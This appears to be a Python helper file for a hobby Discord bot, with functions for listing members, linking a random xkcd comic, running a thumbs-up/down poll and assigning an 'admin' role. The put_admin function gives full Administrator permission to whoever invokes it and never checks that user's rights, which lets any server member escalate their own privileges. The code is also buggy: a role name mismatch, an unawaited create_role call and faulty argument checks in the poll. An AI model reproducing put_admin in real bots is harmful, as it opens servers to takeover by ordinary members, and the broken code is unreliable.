import discord
from discord.ext import commands
import random

def name(ctx):
        return ctx.author

def count(ctx, bot):
        members = []
        for guild in bot.guilds:
                for member in guild.members:
                        members.append(member)
        return members

async def put_admin(ctx, user):
        hasAdminRole = False
        for role in ctx.guild.roles:
                if (role.name == "@admin"):
                        hasAdminRole = True
                        break
        if not hasAdminRole:
                ctx.guild.create_role(name="admin", permissions=discord.Permissions(8))
        
        role = discord.utils.get(ctx.guild.roles, name="admin")       #print(role)
        await ctx.author.add_roles(role)
        return user

def put_commic(ctx):
        rand = random.randint(1,2500)
        url = "https://xkcd.com/" + str(rand)
        return url
        
async def create_poll(ctx, args):
        size = len(args)
        
        if (size <= 2):
                return "Error poll must have a question and 2 answers"
        question = args[0]
        answer1 = args[1]
        answer2 = args[2]

        message = await ctx.send("New poll " + question + ": " + answer1 + " or " +  answer2)
        await message.add_reaction(":thumbsup:")
        await message.add_reaction(":thumbsdown:")

        return "A toi de jouer"

        